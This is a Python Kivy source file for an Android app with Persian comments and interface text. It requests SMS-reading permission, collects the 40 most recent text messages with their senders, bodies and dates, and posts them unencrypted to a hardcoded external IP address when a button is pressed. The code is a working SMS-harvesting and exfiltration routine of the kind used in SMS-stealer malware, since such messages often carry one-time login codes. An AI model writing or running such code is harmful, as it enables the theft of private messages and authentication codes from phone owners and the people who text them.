from kivy.app import App
from kivy.uix.button import Button
from kivy.uix.boxlayout import BoxLayout
import requests
from android.permissions import request_permissions, Permission
from android.storage import app_storage_path
import json

class SmsSenderApp(App):
    def build(self):
        # درخواست مجوزهای لازم در اندروید
        request_permissions([Permission.READ_SMS, Permission.INTERNET])
        
        layout = BoxLayout(orientation='vertical')
        self.btn = Button(
            text='ارسال 40 پیام به سرور',
            size_hint=(0.5, 0.2),
            pos_hint={'center_x': 0.5, 'center_y': 0.5}
        )
        self.btn.bind(on_press=self.send_sms_to_server)
        layout.add_widget(self.btn)
        return layout
    
    def get_sms_messages(self, limit=40):
        """
        دریافت پیام‌های SMS از دستگاه اندروید
        """
        try:
            from jnius import autoclass
            # استفاده از مسیر صحیح برای کلاس‌های SMS در اندروید
            Sms = autoclass('android.provider.Telephony$Sms')
            ContentResolver = autoclass('android.content.ContentResolver')
            context = autoclass('org.kivy.android.PythonActivity').mActivity
            resolver = context.getContentResolver()
            
            cursor = resolver.query(
                Sms.CONTENT_URI,
                None, None, None, 
                f"{Sms.DATE} DESC LIMIT {limit}"
            )
            
            messages = []
            if cursor:
                while cursor.moveToNext():
                    msg = {
                        'address': cursor.getString(cursor.getColumnIndex(Sms.ADDRESS)),
                        'body': cursor.getString(cursor.getColumnIndex(Sms.BODY)),
                        'date': cursor.getString(cursor.getColumnIndex(Sms.DATE)),
                        'type': cursor.getString(cursor.getColumnIndex(Sms.TYPE))
                    }
                    messages.append(msg)
                cursor.close()
            return messages
        except Exception as e:
            print(f"خطا در دریافت پیام‌ها: {e}")
            return []
    
    def send_sms_to_server(self, instance):
        """
        ارسال پیام‌ها به سرور
        """
        server_url = "http://144.172.112.112:8000/api/messeges"  # آدرس سرور خود را قرار دهید
        self.btn.text = "در حال ارسال..."
        self.btn.disabled = True
        
        try:
            # دریافت 40 پیام آخر
            sms_messages = self.get_sms_messages(40)
            
            if not sms_messages:
                self.btn.text = "پیامی یافت نشد!"
                return
            
            # ارسال به سرور
            headers = {'Content-Type': 'application/json'}
            response = requests.post(
                server_url,
                data=json.dumps({'messages': sms_messages}),
                headers=headers
            )
            
            if response.status_code == 200:
                self.btn.text = "پیام‌ها با موفقیت ارسال شد!"
            else:
                self.btn.text = f"خطا در ارسال: {response.status_code}"
                
        except Exception as e:
            self.btn.text = f"خطا: {str(e)}"
        finally:
            self.btn.disabled = False

if __name__ == '__main__':
    SmsSenderApp().run()